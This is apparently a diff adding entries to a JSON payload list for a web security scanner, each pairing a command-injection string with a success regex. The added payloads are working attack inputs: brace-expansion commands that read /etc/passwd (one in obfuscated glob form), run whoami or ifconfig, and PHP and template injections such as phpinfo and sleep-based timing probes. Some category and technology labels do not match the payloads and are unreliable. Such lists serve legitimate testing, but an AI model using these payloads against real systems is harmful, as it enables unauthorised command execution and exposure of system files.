@@ -86,5 +86,214 @@
       "expected_status_code": 200,
       "success_regex": "root:|uid=|Volume"
     }
+  },
+  {
+    "payload_id": "OWP-214578",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Linux",
+    "injection_point": "body_json",
+    "payload_string": "{cat,/etc/passwd}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214593",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{,ip,a}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214594",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{,ifconfig}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214595",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{,ifconfig,eth0}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214596",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{l,-lh}s",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214597",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{,echo,#test}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214598",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{,$\"whoami\",}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214599",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{,/?s?/?i?/c?t,/e??/p??s??,}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214897",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": " {${phpinfo()}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214932",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "MySQL",
+    "injection_point": "body_json",
+    "payload_string": "{${sleep(10)}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214941",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "MySQL",
+    "injection_point": "body_json",
+    "payload_string": " {${sleep(20)}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214942",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "MySQL",
+    "injection_point": "body_json",
+    "payload_string": "{${sleep(20)}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214943",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "MySQL",
+    "injection_point": "body_json",
+    "payload_string": " {${sleep(3)}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214944",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "MySQL",
+    "injection_point": "body_json",
+    "payload_string": "{${sleep(3)}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214947",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "MySQL",
+    "injection_point": "body_json",
+    "payload_string": " {${sleep(hexdec(dechex(20)))}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-214948",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "MySQL",
+    "injection_point": "body_json",
+    "payload_string": "{${sleep(hexdec(dechex(20)))}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-215055",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{1} + {1}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-215056",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
+  },
+  {
+    "payload_id": "OWP-395825",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{cmd}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid=|gid=|Microsoft Windows|Volume Serial"
+    }
   }
 ]
